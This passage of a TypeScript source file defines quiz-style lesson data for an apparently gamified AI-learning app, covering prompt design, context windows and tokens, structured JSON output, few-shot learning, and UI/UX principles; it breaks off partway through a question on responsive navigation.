import type { LessonStep } from '@/types'

// ============================================
// Comprehensive AI Learning Curriculum
// Each lesson has 8-12 steps with deep content
// ============================================

export interface LessonContent {
    id: string
    title: string
    rewardXp: number
    area: 'ai_university' | 'ai_labor' | 'outside' | 'security_hub'
    steps: LessonStep[]
}

// ========================================
// LESSON 1: PROMPTING MASTERCLASS
// ========================================
export const LESSON_PROMPTING_MASTERCLASS: LessonContent = {
    id: 'lesson_prompting_basics',
    title: 'Prompting Masterclass',
    rewardXp: 50,
    area: 'ai_university',
    steps: [
        {
            type: 'text',
            text: `📚 PROMPTING MASTERCLASS

Welcome to the most important skill in AI engineering: Prompt Design.

A prompt is your interface to the AI. Unlike traditional programming where you write explicit instructions, prompting is about COMMUNICATION. You're not just giving commands — you're setting up a context where the AI can succeed.

Why does this matter?
• The same AI with a bad prompt = useless output
• The same AI with a great prompt = production-ready results
• Your prompts ARE your product in AI applications

Let's dive deep into the art and science of prompting.`,
        },
        {
            type: 'text',
            text: `🎭 THE ROLE FRAMEWORK

The first pillar of great prompts is ROLE ASSIGNMENT.

When you give an AI a role, you're activating specific knowledge patterns. Compare:

❌ BAD: "Write some code"
✅ GOOD: "You are a senior software engineer at Google with 15 years of experience in distributed systems. You prioritize clean, maintainable code and always consider edge cases."

The specific role primes the AI to:
• Use domain-specific vocabulary
• Apply best practices from that field
• Consider concerns a real expert would consider

Pro tip: Add experience level, company culture, and specific expertise areas.`,
        },
        {
            type: 'question',
            question: 'You need code that handles millions of concurrent users. Which role is BEST?',
            options: [
                '"You are a helpful assistant"',
                '"You are a junior developer learning to code"',
                '"You are a principal engineer at Netflix specializing in high-throughput distributed systems"',
                '"Write scalable code"',
            ],
            correctIndex: 2,
            explanation: 'The Netflix principal engineer role activates patterns for scale, reliability, and battle-tested architecture decisions.',
        },
        {
            type: 'text',
            text: `🎯 GOAL SPECIFICATION

Vague goals produce vague outputs. Specific goals produce actionable outputs.

The SMART framework works for AI too:
• Specific: What exactly should be produced?
• Measurable: How will success be evaluated?
• Actionable: Is it clear what steps to take?
• Relevant: Does it focus on what matters?
• Time-bound: Are there length/scope constraints?

❌ VAGUE: "Help me with my project"
✅ SMART: "Create a Python function that validates email addresses using regex. It should return True for valid emails and False for invalid ones. Include at least 5 test cases covering edge cases like missing @ symbol, invalid TLDs, and special characters."`,
        },
        {
            type: 'question',
            question: 'Which goal specification will produce the most useful API documentation?',
            options: [
                '"Write some docs"',
                '"Document my API"',
                '"Create OpenAPI 3.0 documentation for each endpoint including: HTTP method, path, request body schema with examples, response codes with descriptions, and authentication requirements"',
                '"Make it good"',
            ],
            correctIndex: 2,
            explanation: 'The detailed specification tells the AI exactly what to include, following a known standard (OpenAPI 3.0).',
        },
        {
            type: 'text',
            text: `📋 OUTPUT FORMAT CONTROL

For production AI applications, you MUST control the output format.

TECHNIQUES:

1. EXPLICIT FORMAT:
"Respond only with valid JSON. No markdown. No explanation."

2. SCHEMA DEFINITION:
"Use this exact schema: {name: string, age: number, skills: string[]}"

3. EXAMPLES (Few-shot):
"Example output: {name: "Alice", age: 30, skills: ["Python", "ML"]}"

4. NEGATIVE EXAMPLES:
"Do NOT include any prose before or after the JSON."

5. API-LEVEL CONTROL:
response_format: { type: "json_object" }

Always prefer API-level control when available — it's enforced by the model itself.`,
        },
        {
            type: 'question',
            question: 'Your AI keeps adding "Here is the JSON:" before the actual JSON. Best fix?',
            options: [
                'Parse around it in your code',
                'Add "Output ONLY the raw JSON object. Start your response with { and end with }. No prose."',
                'Switch to a different AI model',
                'Accept the extra text as part of the output',
            ],
            correctIndex: 1,
            explanation: 'Being extremely explicit about starting with { and ending with } eliminates the prose. Never work around bad prompts in code.',
        },
        {
            type: 'text',
            text: `🔒 CONSTRAINTS & GUARDRAILS

Constraints prevent the AI from going off-track. They're your safety net.

TYPES OF CONSTRAINTS:

LENGTH:
• "Maximum 3 sentences"
• "Between 100-150 words"
• "Exactly 5 bullet points"

SCOPE:
• "Only discuss Python, not other languages"
• "Focus only on the frontend, ignore backend"
• "Do not mention competitors"

STYLE:
• "Use formal business English"
• "Explain like I'm 5"
• "Write in active voice only"

SAFETY:
• "Do not include any PII examples"
• "Use fictional company names only"
• "Avoid any medical/legal advice"`,
        },
        {
            type: 'question',
            question: 'You want a brief summary for busy executives. Which constraints are MOST effective?',
            options: [
                '"Make it short"',
                '"3 bullet points maximum. Each bullet ≤15 words. Lead with the business impact. No technical jargon."',
                '"Executive summary please"',
                '"Keep it brief and professional"',
            ],
            correctIndex: 1,
            explanation: 'Quantified limits (3 bullets, 15 words) combined with style requirements (lead with impact, no jargon) are enforceable.',
        },
        {
            type: 'text',
            text: `🔄 ITERATIVE REFINEMENT

No prompt is perfect on the first try. Great prompt engineers iterate.

THE REFINEMENT LOOP:

1. START SIMPLE
   Begin with a basic prompt to see baseline behavior

2. IDENTIFY GAPS
   What's missing? What's wrong? What's inconsistent?

3. ADD SPECIFICITY
   Target the gaps with more detailed instructions

4. TEST EDGE CASES
   Try inputs that might break the prompt

5. DOCUMENT
   Save working prompts in a prompt library

ANTI-PATTERNS TO AVOID:
❌ Making prompts too long (token waste)
❌ Contradictory instructions
❌ Assuming the AI "knows" your context
❌ Not testing with diverse inputs`,
        },
        {
            type: 'question',
            question: 'Your prompt works for 90% of cases but fails on edge cases. Best approach?',
            options: [
                'Accept 90% success rate',
                'Start completely over with a new prompt',
                'Add specific handling for the edge cases as additional constraints',
                'Use a different AI model',
            ],
            correctIndex: 2,
            explanation: 'Iterative refinement means addressing specific failures, not starting over. Add explicit handling for edge cases.',
        },
        {
            type: 'text',
            text: `✅ PROMPTING MASTERCLASS COMPLETE!

KEY TAKEAWAYS:

🎭 ROLE: Assign specific expertise with experience level
🎯 GOAL: Use SMART criteria for actionable outputs
📋 FORMAT: Control output structure explicitly
🔒 CONSTRAINTS: Set quantified limits and scope
🔄 ITERATE: Refine based on failures, not assumptions

ADVANCED TECHNIQUES (covered in other lessons):
• Few-shot learning with examples
• Chain-of-thought reasoning
• Self-consistency checking
• Role-playing for complex scenarios

You've earned 50 XP! 🎓`,
        },
    ],
}

// ========================================
// LESSON 2: CONTEXT WINDOW MASTERY
// ========================================
export const LESSON_CONTEXT_MASTERY: LessonContent = {
    id: 'lesson_context_tokens',
    title: 'Context Window Mastery',
    rewardXp: 55,
    area: 'ai_university',
    steps: [
        {
            type: 'text',
            text: `📚 CONTEXT WINDOW MASTERY

The context window is the AI's "working memory" — everything it can "see" at once.

Think of it like a whiteboard:
• You can only fit so much on it
• Old content gets erased to make room for new
• What's on the board IS the AI's entire world

This lesson will teach you to manage context like a pro, avoiding the common pitfalls that break production AI applications.`,
        },
        {
            type: 'text',
            text: `🔤 UNDERSTANDING TOKENS

Tokens are NOT words. They're chunks that the AI processes.

TOKENIZATION EXAMPLES:
• "hello" → 1 token
• "Hello, world!" → 4 tokens (Hello, ,, world, !)
• "indivisibility" → 4 tokens (ind, ivis, ibil, ity)
• Code → Usually MORE tokens than prose
• Non-English → Often MORE tokens per word

CONTEXT WINDOW SIZES (2024):
• GPT-3.5: 4K-16K tokens
• GPT-4: 8K-128K tokens
• Claude: 100K-200K tokens
• Gemini: Up to 2M tokens

TOKEN COST RULE OF THUMB:
~4 characters ≈ 1 token
~1,000 tokens ≈ 750 words`,
        },
        {
            type: 'question',
            question: 'You have a 4K token limit. How many words can you fit approximately?',
            options: [
                '~500 words',
                '~3,000 words',
                '~10,000 words',
                '~4,000 words',
            ],
            correctIndex: 1,
            explanation: 'At ~750 words per 1,000 tokens, 4K tokens ≈ 3,000 words. But this varies with content type!',
        },
        {
            type: 'text',
            text: `📍 THE PRIMACY-RECENCY EFFECT

AI models pay MORE attention to:
1. The BEGINNING of the context (primacy)
2. The END of the context (recency)

The MIDDLE often gets "lost" — this is called the "lost in the middle" problem.

STRATEGIC PLACEMENT:
✅ System prompt → BEGINNING (always visible)
✅ Current task/question → END (freshest attention)
⚠️ Long documents → MIDDLE (may be missed)

MITIGATION STRATEGIES:
• Put key facts at start AND end
• Summarize long documents before inserting
• Use retrieval (RAG) for large knowledge bases
• Chunk documents and process separately`,
        },
        {
            type: 'question',
            question: 'You have a 50-page document and need AI to answer questions about it. Best approach?',
            options: [
                'Paste the entire document in every prompt',
                'Use RAG: chunk the document, retrieve relevant sections, include only those',
                'Ask the user to find the relevant page themselves',
                'Summarize to 1 paragraph and lose all detail',
            ],
            correctIndex: 1,
            explanation: 'RAG (Retrieval-Augmented Generation) retrieves only relevant chunks, staying within token limits while preserving detail.',
        },
        {
            type: 'text',
            text: `🔄 CONVERSATION MANAGEMENT

Long conversations cause context overflow. You MUST manage them.

STRATEGIES:

1. ROLLING SUMMARY
Periodically summarize old messages:
"[Summary of conversation so far: User wants to build a todo app with React. We decided on TypeScript and Zustand for state.]"

2. SLIDING WINDOW
Keep only the last N messages + system prompt

3. SEMANTIC COMPRESSION
Keep key decisions, remove chitchat:
❌ "Oh that's a great idea! I love it!"
✅ "Decision: Use PostgreSQL for database"

4. EXPLICIT STATE
Maintain a "current state" object:
{ task: "todo app", tech: ["React", "TS"], phase: "database design" }`,
        },
        {
            type: 'question',
            question: 'Your chatbot conversation is 180 messages long and responses are degrading. Best fix?',
            options: [
                'Just let it keep growing',
                'Implement rolling summaries every 20 messages, keeping last 10 + summary',
                'Start a new conversation and lose all context',
                'Tell users to type shorter messages',
            ],
            correctIndex: 1,
            explanation: 'Rolling summaries preserve context intelligently while staying within limits. The last 10 messages provide immediate context.',
        },
        {
            type: 'text',
            text: `💰 TOKEN ECONOMICS

Tokens cost money. A LOT of money at scale.

COST CALCULATION:
• Input tokens (what you send) → Cheaper
• Output tokens (AI response) → 2-4x more expensive

OPTIMIZATION TACTICS:

1. CACHE PROMPTS
Many APIs cache identical prompts — reuse exact system prompts

2. MINIMIZE OUTPUT
Ask for concise responses:
"Respond in ≤50 words" saves money

3. BATCH OPERATIONS
Instead of 10 calls with 1 item each:
→ 1 call with 10 items (shared context)

4. CHOOSE MODEL BY TASK
• Simple tasks → Cheaper model (GPT-3.5, Haiku)
• Complex tasks → Expensive model (GPT-4, Opus)`,
        },
        {
            type: 'question',
            question: 'You have 1 million customer support tickets to classify. Most cost-effective approach?',
            options: [
                'Send each ticket individually to GPT-4',
                'Batch 10-20 tickets per call with a cheaper model, use GPT-4 only for ambiguous cases',
                'Hire humans instead',
                'Classify randomly to avoid costs',
            ],
            correctIndex: 1,
            explanation: 'Batching reduces overhead, cheaper models handle simple cases, expensive models catch edge cases. This is called "model routing."',
        },
        {
            type: 'text',
            text: `🧪 TESTING CONTEXT LIMITS

Before deploying, test your context handling:

TEST SCENARIOS:

1. EMPTY CONTEXT
Does it work with minimal input?

2. MAXIMUM CONTEXT
What happens at the limit?

3. ADVERSARIAL INPUT
Extra-long single messages?

4. MULTI-TURN STRESS
50+ message conversations?

5. LANGUAGE MIX
Non-English text (more tokens)?

MONITORING IN PRODUCTION:
• Track token usage per request
• Alert on high token counts
• Log when context is truncated
• A/B test context strategies`,
        },
        {
            type: 'question',
            question: 'Users report "the AI forgot what we discussed earlier." Most likely cause?',
            options: [
                'The AI model is broken',
                'Context window overflow causing older messages to be dropped',
                'Users are imagining things',
                'Network latency',
            ],
            correctIndex: 1,
            explanation: 'This is the classic symptom of context overflow. Implement summarization or sliding window to fix it.',
        },
        {
            type: 'text',
            text: `✅ CONTEXT WINDOW MASTERY COMPLETE!

KEY TAKEAWAYS:

🔤 TOKENS: ~4 chars = 1 token, code uses more
📍 PLACEMENT: Key info at START and END
🔄 MANAGEMENT: Rolling summaries for long conversations
💰 ECONOMICS: Batch, cache, and route by complexity
🧪 TESTING: Stress test limits before production

CONTEXT MANAGEMENT CHECKLIST:
□ Token counting in place
□ Summarization strategy defined
□ Sliding window implemented
□ Cost monitoring active
□ Overflow handling tested

You've earned 55 XP! 🎓`,
        },
    ],
}

// ========================================
// LESSON 3: STRUCTURED OUTPUT ENGINEERING
// ========================================
export const LESSON_STRUCTURED_OUTPUTS: LessonContent = {
    id: 'lesson_json_outputs',
    title: 'Structured Output Engineering',
    rewardXp: 60,
    area: 'ai_university',
    steps: [
        {
            type: 'text',
            text: `📚 STRUCTURED OUTPUT ENGINEERING

In production AI applications, prose is useless. You need DATA.

• Frontend needs JSON to render
• Databases need structured records
• APIs need predictable schemas
• Analytics need parseable logs

This lesson teaches you to get RELIABLE structured outputs from AI — the foundation of every AI-powered application.`,
        },
        {
            type: 'text',
            text: `🔧 THE STRUCTURED OUTPUT STACK

Four layers of reliability:

1. PROMPT-LEVEL
Explicit instructions in the prompt

2. SCHEMA-LEVEL
Provide exact data structures

3. API-LEVEL
Use response_format or function calling

4. CODE-LEVEL
Validation and fallback handling

Each layer adds reliability. Production apps use ALL FOUR.

❌ DON'T: Rely only on prompt instructions
✅ DO: Defense in depth with all layers`,
        },
        {
            type: 'question',
            question: 'Your AI sometimes returns invalid JSON that crashes your app. Best fix?',
            options: [
                'Ask users to try again',
                'Make the prompt more explicit',
                'Use API-level JSON mode + code-level validation with retry logic',
                'Switch to a different AI provider',
            ],
            correctIndex: 2,
            explanation: 'Multiple layers: API mode enforces structure, validation catches edge cases, retry handles transient failures.',
        },
        {
            type: 'text',
            text: `📝 SCHEMA DEFINITION TECHNIQUES

TECHNIQUE 1: TypeScript-style
{
  name: string,
  age: number,
  skills: string[],
  metadata?: { created: string }
}

TECHNIQUE 2: JSON Schema
{
  "type": "object",
  "properties": {
    "name": { "type": "string" },
    "age": { "type": "integer", "minimum": 0 }
  },
  "required": ["name", "age"]
}

TECHNIQUE 3: Example-based
"Output format example:
{
  "name": "Alice",
  "age": 30,
  "skills": ["Python", "ML"]
}"

BEST PRACTICE: Combine schema + example for maximum clarity.`,
        },
        {
            type: 'question',
            question: 'You need optional fields AND strict types. Which approach?',
            options: [
                'Just describe it in prose',
                'TypeScript-style with ? for optional + JSON Schema for validation',
                'Make all fields required',
                'Skip optional fields entirely',
            ],
            correctIndex: 1,
            explanation: 'TypeScript-style is readable for the AI, JSON Schema is machine-validatable. Use both.',
        },
        {
            type: 'text',
            text: `🎯 FUNCTION CALLING / TOOL USE

Modern APIs support "function calling" — the most reliable structured output.

HOW IT WORKS:
1. You define functions with typed parameters
2. AI "calls" the function with structured args
3. You receive guaranteed-valid structured data

EXAMPLE (OpenAI):
{
  "name": "extract_contact",
  "parameters": {
    "type": "object",
    "properties": {
      "name": { "type": "string" },
      "email": { "type": "string", "format": "email" },
      "phone": { "type": "string" }
    },
    "required": ["name", "email"]
  }
}

OUTPUT: {"name": "Alice", "email": "alice@example.com"}

The AI CANNOT output invalid structure!`,
        },
        {
            type: 'question',
            question: 'When should you use function calling over JSON mode?',
            options: [
                'Never, JSON mode is always better',
                'When you need multiple output types or strict schema enforcement',
                'Only for simple key-value outputs',
                'Function calling is deprecated',
            ],
            correctIndex: 1,
            explanation: 'Function calling enforces schema at the API level and supports multiple return types (tool selection).',
        },
        {
            type: 'text',
            text: `🛡️ VALIDATION & ERROR HANDLING

Even with perfect prompts, validate EVERYTHING.

VALIDATION CHECKLIST:
□ Is it valid JSON/XML?
□ Does it match the expected schema?
□ Are required fields present?
□ Are values in acceptable ranges?
□ Are strings non-empty when required?
□ Are enums valid values?

ERROR HANDLING STRATEGIES:

1. RETRY
Try again with same prompt (transient failures)

2. RETRY WITH FEEDBACK
"Your output was invalid. Error: missing 'email'. Try again."

3. FALLBACK
Use default values or simpler extraction

4. ESCALATE
Flag for human review if critical`,
        },
        {
            type: 'question',
            question: 'AI returns {"name": "Alice", "age": "thirty"}. age should be a number. Best handling?',
            options: [
                'Crash the application',
                'Accept the string silently',
                'Retry with feedback: "age must be a number, not a string. Re-extract with numeric age."',
                'Delete the user',
            ],
            correctIndex: 2,
            explanation: 'Retry with specific feedback often fixes the issue. If it persists, fallback to parsing "thirty" → 30.',
        },
        {
            type: 'text',
            text: `📊 COMPLEX NESTED STRUCTURES

Real applications need complex outputs. Handle nested structures carefully.

EXAMPLE: E-commerce order extraction
{
  "order_id": "ORD-12345",
  "customer": {
    "name": "Alice",
    "email": "alice@example.com"
  },
  "items": [
    { "sku": "ABC-1", "quantity": 2, "price": 29.99 },
    { "sku": "XYZ-9", "quantity": 1, "price": 99.99 }
  ],
  "shipping": {
    "address": { "street": "123 Main St", "city": "NYC" },
    "method": "express"
  }
}

TIPS FOR NESTED STRUCTURES:
• Flatten when possible (reduces errors)
• Validate each level separately
• Provide examples of EACH nesting level
• Consider splitting into multiple AI calls`,
        },
        {
            type: 'question',
            question: 'AI struggles with deeply nested output (5+ levels). Best approach?',
            options: [
                'Keep trying with longer prompts',
                'Split into multiple calls: first extract top-level, then details per section',
                'Accept whatever structure it returns',
                'Remove all nesting from your data model',
            ],
            correctIndex: 1,
            explanation: 'Breaking complex extractions into focused steps reduces errors and improves reliability.',
        },
        {
            type: 'text',
            text: `✅ STRUCTURED OUTPUT ENGINEERING COMPLETE!

RELIABILITY STACK:
1️⃣ PROMPT: Explicit format instructions + examples
2️⃣ SCHEMA: TypeScript-style + JSON Schema
3️⃣ API: JSON mode or function calling
4️⃣ CODE: Validation + retry + fallback

PRODUCTION CHECKLIST:
□ Schema defined and documented
□ API-level enforcement enabled
□ Validation library integrated
□ Retry logic with feedback
□ Fallback for edge cases
□ Monitoring for failures

You've earned 60 XP! 🎓`,
        },
    ],
}

// ========================================
// LESSON 4: FEW-SHOT LEARNING DEEP DIVE
// ========================================
export const LESSON_FEW_SHOT_DEEP: LessonContent = {
    id: 'lesson_few_shot_prompting',
    title: 'Few-Shot Learning Deep Dive',
    rewardXp: 65,
    area: 'ai_labor',
    steps: [
        {
            type: 'text',
            text: `📚 FEW-SHOT LEARNING DEEP DIVE

Few-shot learning is teaching by example. Instead of explaining rules, you SHOW the pattern.

WHY IT WORKS:
• AI excels at pattern recognition
• Examples are unambiguous
• Reduces need for complex instructions
• Works across languages and domains

This advanced lesson covers techniques used in production AI systems.`,
        },
        {
            type: 'text',
            text: `📖 THE SPECTRUM OF SHOTS

ZERO-SHOT: No examples
"Classify this text as positive or negative"

ONE-SHOT: Single example
"Example: 'I love this!' → positive
Classify: 'This is terrible'"

FEW-SHOT: 2-5 examples
"Example 1: 'I love this!' → positive
Example 2: 'Worst ever' → negative
Example 3: 'It's okay' → neutral
Classify: 'Pretty good overall'"

MANY-SHOT: 10+ examples
Used for complex patterns or fine-grained categories

RULE OF THUMB:
• Simple tasks: Zero-shot works
• Moderate tasks: 2-3 examples
• Complex/nuanced: 5-7 examples
• Highly specialized: Fine-tune instead`,
        },
        {
            type: 'question',
            question: 'You need to classify customer feedback into 12 specific categories. Best approach?',
            options: [
                'Zero-shot with category list',
                'One example per category (12 examples) covering edge cases',
                'Just 2 examples total',
                'Skip classification entirely',
            ],
            correctIndex: 1,
            explanation: 'With 12 categories, each needs at least one clear example. Edge cases need additional examples.',
        },
        {
            type: 'text',
            text: `🎯 EXAMPLE SELECTION STRATEGY

Not all examples are equal. Strategic selection matters.

SELECTION CRITERIA:

1. DIVERSITY
Cover different scenarios, not just easy cases
❌ 3 "positive" examples
✅ positive + negative + edge case

2. BOUNDARY CASES
Include examples near decision boundaries
"Pretty good but overpriced" → does this pattern match?

3. FORMAT CONSISTENCY
All examples should follow identical structure
Input: [x] → Output: [y]
Input: [x] → Output: [y]

4. DIFFICULTY GRADIENT
Start simple, add complexity
Easy example → Medium → Hard → Edge case

5. REPRESENTATIVE
Match the distribution of real inputs`,
        },
        {
            type: 'question',
            question: 'Your examples are all "perfect" cases. Users report poor performance on edge cases. Why?',
            options: [
                'The model is broken',
                'Examples didn\'t cover edge cases, so the AI doesn\'t know how to handle them',
                'Users are using the system wrong',
                'More examples always help',
            ],
            correctIndex: 1,
            explanation: 'AI learns from what you show. If examples only cover ideal cases, edge cases will fail. Include boundary examples.',
        },
        {
            type: 'text',
            text: `🔀 ADVANCED: CHAIN-OF-THOUGHT FEW-SHOT

Combine examples with reasoning steps.

STANDARD FEW-SHOT:
Input: "2 + 2 * 3"
Output: 8

CHAIN-OF-THOUGHT FEW-SHOT:
Input: "2 + 2 * 3"
Reasoning: 
1. Follow order of operations (PEMDAS)
2. First multiply: 2 * 3 = 6
3. Then add: 2 + 6 = 8
Output: 8

The AI learns not just WHAT to output, but HOW to think.

USE CASES:
• Math problems
• Logical reasoning
• Code debugging
• Complex decision making`,
        },
        {
            type: 'question',
            question: 'AI gives correct answers but users don\'t trust them. Adding what would help?',
            options: [
                'More examples',
                'Chain-of-thought reasoning in examples so AI explains its logic',
                'Faster response times',
                'Prettier formatting',
            ],
            correctIndex: 1,
            explanation: 'When AI shows its reasoning (like in COT), users can verify the logic and build trust.',
        },
        {
            type: 'text',
            text: `📐 PROMPT STRUCTURE FOR FEW-SHOT

OPTIMAL STRUCTURE:

[SYSTEM INSTRUCTION]
You are a sentiment classifier. Given customer feedback, classify as positive, negative, or neutral.

[EXAMPLES]
Input: "Best purchase ever!"
Output: positive

Input: "Complete waste of money"
Output: negative

Input: "It works, nothing special"
Output: neutral

[CURRENT TASK]
Input: "{user_input}"
Output:

KEY POINTS:
• System instruction sets context
• Examples are clearly delimited
• Current task follows same format
• Output position guides completion`,
        },
        {
            type: 'question',
            question: 'Your examples use "Text:" but current task uses "Input:". Results are inconsistent. Why?',
            options: [
                'The AI is confused',
                'Format inconsistency between examples and task breaks pattern matching',
                'You need more examples',
                'Use a larger model',
            ],
            correctIndex: 1,
            explanation: 'Consistency is critical. The AI learned "Text: → Output:" but sees "Input:" — this breaks the pattern.',
        },
        {
            type: 'text',
            text: `🔧 DEBUGGING FEW-SHOT PROMPTS

COMMON ISSUES:

1. OUTPUT FORMAT DRIFT
Symptom: AI adds extra text around answer
Fix: Add "Output ONLY the classification" + negative examples

2. EXAMPLE CONTAMINATION
Symptom: AI copies text from examples
Fix: Use clearly different example content

3. RECENCY BIAS
Symptom: AI favors pattern from last example
Fix: Randomize example order or balance categories

4. OVER-SPECIFICITY
Symptom: Works only on example-like inputs
Fix: Add diverse examples with variation

5. UNDER-FITTING
Symptom: Ignores examples entirely
Fix: Add more examples or simplify the task`,
        },
        {
            type: 'question',
            question: 'AI always outputs "positive" regardless of input. Your last 3 examples were all positive. Cause?',
            options: [
                'The AI likes positivity',
                'Recency bias — AI learned "just output positive" from the last examples',
                'Positive feedback is more common',
                'Too few examples',
            ],
            correctIndex: 1,
            explanation: 'Recency bias means the AI weights recent examples more. Always balance example categories.',
        },
        {
            type: 'text',
            text: `✅ FEW-SHOT LEARNING DEEP DIVE COMPLETE!

MASTERY CHECKLIST:
✓ Understand shot spectrum (0-shot → many-shot)
✓ Strategic example selection
✓ Diversity and boundary coverage
✓ Chain-of-thought integration
✓ Format consistency
✓ Common debugging patterns

PRODUCTION TIPS:
□ Test with held-out examples not in prompt
□ A/B test example sets
□ Monitor for category drift over time
□ Version control your example sets
□ Collect failure cases for future examples

You've earned 65 XP! 🎓`,
        },
    ],
}

// ========================================
// LESSON 5: UI/UX MASTERCLASS
// ========================================
export const LESSON_UI_UX_MASTERCLASS: LessonContent = {
    id: 'lesson_ui_ux_basics',
    title: 'UI/UX Masterclass',
    rewardXp: 70,
    area: 'outside',
    steps: [
        {
            type: 'text',
            text: `🎨 UI/UX MASTERCLASS

Welcome to the Design Atelier! This lesson covers the principles that separate amateur interfaces from professional products.

UI = User Interface (what it LOOKS like)
• Visual design, typography, color
• Layout, spacing, hierarchy
• Icons, images, animations

UX = User Experience (how it WORKS)
• Task completion efficiency
• Error prevention and recovery
• Mental model alignment
• Emotional response

The best products excel at BOTH. Let's learn how.`,
        },
        {
            type: 'text',
            text: `🎯 NIELSEN'S 10 USABILITY HEURISTICS

These are the universal laws of good UX:

1. VISIBILITY OF SYSTEM STATUS
Always show users what's happening

2. MATCH SYSTEM TO REAL WORLD
Use language and concepts users understand

3. USER CONTROL AND FREEDOM
Provide undo, exit, and recovery options

4. CONSISTENCY AND STANDARDS
Follow platform conventions

5. ERROR PREVENTION
Design to prevent mistakes before they happen

6. RECOGNITION > RECALL
Show options rather than requiring memory

7. FLEXIBILITY & EFFICIENCY
Support both novices and experts

8. AESTHETIC & MINIMALIST DESIGN
Remove unnecessary elements

9. HELP USERS RECOGNIZE ERRORS
Clear error messages with solutions

10. HELP AND DOCUMENTATION
Easy to search, focused on tasks`,
        },
        {
            type: 'question',
            question: 'Users frequently upload the wrong file type. Which heuristic addresses this BEST?',
            options: [
                'Aesthetic design — make it beautiful',
                'Error prevention — only show valid file types in picker, validate before upload',
                'Visibility — show a loading spinner',
                'Flexibility — let them upload anything',
            ],
            correctIndex: 1,
            explanation: 'Error prevention means designing the UI so mistakes can\'t happen, not catching them after.',
        },
        {
            type: 'text',
            text: `📐 VISUAL HIERARCHY

Users scan in patterns. Design for these patterns.

THE F-PATTERN (Text-heavy pages):
• Users scan the top horizontally
• Then down the left side
• Making quick horizontal scans
→ Put key info in the "F" areas

THE Z-PATTERN (Landing pages):
• Eye starts top-left
• Moves right across header
• Diagonal to bottom-left
• Right across CTA area
→ Place logo top-left, CTA bottom-right

HIERARCHY TOOLS:
• SIZE: Bigger = more important
• COLOR: Contrast draws attention
• WEIGHT: Bold stands out
• POSITION: Top-left gets seen first
• WHITESPACE: Isolation = importance`,
        },
        {
            type: 'question',
            question: 'Your signup button has a 2% click rate. All elements are the same size and color. Best fix?',
            options: [
                'Add more buttons',
                'Create visual hierarchy: primary CTA should be larger, colored, with whitespace around it',
                'Move the button to the footer',
                'Remove the button entirely',
            ],
            correctIndex: 1,
            explanation: 'Without hierarchy, nothing stands out. The CTA needs visual priority through size, color, and space.',
        },
        {
            type: 'text',
            text: `🎨 COLOR PSYCHOLOGY & SYSTEMS

Colors communicate meaning. Use them intentionally.

COLOR ASSOCIATIONS:
🔵 Blue: Trust, stability, professionalism
   → Banks, enterprise software
🟢 Green: Growth, success, "go"
   → CTAs, success states, eco-brands
🔴 Red: Urgency, danger, "stop"
   → Errors, warnings, sales
🟡 Yellow: Attention, caution
   → Warnings, highlights
⚫ Black: Luxury, sophistication
   → Premium products
⚪ White: Clean, minimal, space
   → Modern tech, healthcare

THE 60-30-10 RULE:
• 60% dominant color (background, large areas)
• 30% secondary color (cards, sections)  
• 10% accent color (CTAs, highlights)

This creates visual balance and clear focal points.`,
        },
        {
            type: 'question',
            question: 'A fintech app uses neon pink as primary, red for CTAs. Trust scores are low. Likely cause?',
            options: [
                'Pink is fine for finance',
                'Color mismatch — finance needs trust colors (blue, green, white), red CTAs suggest danger',
                'Users don\'t care about color',
                'Add more animations',
            ],
            correctIndex: 1,
            explanation: 'Color psychology matters. Finance needs trust signals. Neon pink feels playful, red CTAs feel risky.',
        },
        {
            type: 'text',
            text: `📝 TYPOGRAPHY FUNDAMENTALS

Type can make or break a design.

FONT PAIRING RULES:
• Max 2-3 typefaces per project
• Contrast: Pair serif with sans-serif
• Hierarchy: Different weights, not fonts

LINE LENGTH:
• Ideal: 50-75 characters per line
• Too short = choppy reading
• Too long = reader loses place

LINE HEIGHT (Leading):
• Body text: 1.5-1.75× font size
• Headings: 1.2-1.4× font size

HIERARCHY EXAMPLE:
H1: 32px / 700 weight / 24px margin
H2: 24px / 600 weight / 16px margin
H3: 18px / 600 weight / 12px margin
Body: 16px / 400 weight / 8px margin

ACCESSIBILITY:
• Minimum body: 16px
• Contrast ratio: 4.5:1 for text
• Avoid all-caps for paragraphs`,
        },
        {
            type: 'question',
            question: 'Body text is 12px, light gray (#aaa) on white, 90 characters per line. Users complain of eye strain. Priority fix?',
            options: [
                'Add more images',
                'Increase to 16px, darken to #333, reduce line length to 65 characters',
                'Make the background darker',
                'Use a different font family',
            ],
            correctIndex: 1,
            explanation: 'All three issues compound: text too small, low contrast, lines too long. Fix all three for readability.',
        },
        {
            type: 'text',
            text: `🔄 FEEDBACK & STATE INDICATION

Every action needs acknowledgment.

FEEDBACK TYPES:

1. IMMEDIATE FEEDBACK
• Button changes on press
• Input border on focus
• Character count updates live

2. PROGRESS FEEDBACK
• Loading spinners for 1-3 seconds
• Progress bars for longer operations
• Skeleton loading for content

3. RESULT FEEDBACK
• Success: Green check, confirmation message
• Error: Red alert with fix instructions
• Warning: Yellow caution with context

LOADING STATE RULES:
• <100ms: No feedback needed
• 100ms-1s: Subtle indicator (opacity)
• 1-10s: Spinner with message
• 10s+: Progress bar with percentage
• 30s+: Allow background operation

Never leave users wondering if it worked!`,
        },
        {
            type: 'question',
            question: 'Form submission takes 3 seconds. Button stays unchanged during wait. Users click multiple times. Fix?',
            options: [
                'Make the form simpler',
                'Immediate button state change (loading/disabled), then success/error feedback',
                'Add more server capacity',
                'Remove the submit button',
            ],
            correctIndex: 1,
            explanation: 'Immediate feedback (disabled + loading) prevents multiple submissions and shows progress.',
        },
        {
            type: 'text',
            text: `📱 RESPONSIVE DESIGN PRINCIPLES

One design, all screens.

BREAKPOINTS (Common):
• Mobile: < 640px
• Tablet: 640-1024px
• Desktop: 1024-1440px
• Large: > 1440px

MOBILE-FIRST APPROACH:
1. Design for mobile constraints first
2. Add complexity for larger screens
3. Touch targets: 44×44px minimum
4. Thumb zones matter on mobile

LAYOUT PATTERNS:
• Stack → Grid (cards)
• Hamburger → Visible nav (menus)
• Collapse → Expand (sidebars)
• Swipe → Click (carousels)

TESTING CHECKLIST:
□ 320px (small phones)
□ 375px (iPhone SE)
□ 768px (tablets)
□ 1024px (small laptops)
□ 1440px (desktop)
□ 1920px+ (large monitors)`,
        },
        {
            type: 'question',
            question: 'Desktop nav has 8 items. On mobile, all are crammed illegibly. Best responsive solution?',
            options: [
                'Make font smaller',
                'Hamburger menu with 4 primary icons visible, rest in expandable menu',
                'Remove navigation on mobile',
                'Horizontal scroll for all items',
            ],
            correctIndex: 1,
